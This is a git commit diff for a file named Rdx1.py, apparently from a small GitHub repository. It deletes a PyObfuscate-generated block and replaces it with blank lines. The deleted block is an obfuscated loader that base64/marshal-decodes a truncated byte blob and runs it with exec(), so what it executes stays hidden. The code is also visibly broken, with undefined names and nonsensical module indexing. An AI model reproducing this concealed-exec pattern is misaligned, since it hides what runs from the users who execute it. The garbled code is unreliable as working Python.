0d392ea388df75b7ca4eeeb3ed2f49546f86ed46
Rdx-Vai <132105892+Rdx-vai@users.noreply.github.com>
2023-05-04 04:03:50 +0600

    Update Rdx1.py

--- Rdx1.py
+++ Rdx1.py
@@ -1,9 +1,16 @@
-# Obfuscated with PyObfuscate
-# https://www.github.com/htr-tech
-# Time : Thu Feb 16 20:34:02 2023
-# -------------------------------
-import marshal, dis3
-y = x[::-1]
-b = lambda __ : __import__('marshal').loads(__import__('base64')[::-1]);exec((_)(b'\x00\x00\x00\x04r\x01RB|\x01\x00\x00\xf0\x01RB|\x01\x00\x00\xf0\x01RB|\x01\x00\x00\xf0\x01RB|\x01\x00\x00\xf4\x>
-dis3.dump_to_pyc(b,'c.pyc')
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
